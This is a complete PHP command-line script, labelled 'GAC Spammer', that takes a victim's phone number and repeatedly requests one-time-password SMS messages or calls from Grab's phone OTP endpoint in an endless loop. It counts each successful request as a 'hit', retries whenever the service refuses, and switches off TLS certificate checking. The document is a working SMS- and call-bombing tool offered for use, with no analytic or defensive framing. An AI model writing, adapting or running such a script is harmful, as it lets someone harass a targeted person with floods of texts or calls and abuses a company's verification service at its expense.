<?php

if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["SMS", "CALL"]))) {
	echo "Usage: php ".basename(__FILE__)." <phone_number> [SMS|CALL]\n";
	exit;
} elseif (!isset($argv[2])) {
	$argv[2] = "SMS";
}

$ch = curl_init("https://api.grab.com/grabid/v1/phone/otp");
curl_setopt_array($ch, [
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_POSTFIELDS => "method=".$argv[2]."&countryCode=TH&phoneNumber=".$argv[1]."&templateID=&numDigits=4"
]);

if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - 0 Hits");

$i = 0;
while (true) {
	curl_exec($ch);
	switch (curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
		case 200:
			echo date("[H:i:s]")." OTP Requested.\n";
			if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - ".++$i." Hits");
			sleep(30);
			break;
		default:
			echo date("[H:i:s]")." Unusual Response, Retrying...\n";
			sleep(1);
	}
}

?>
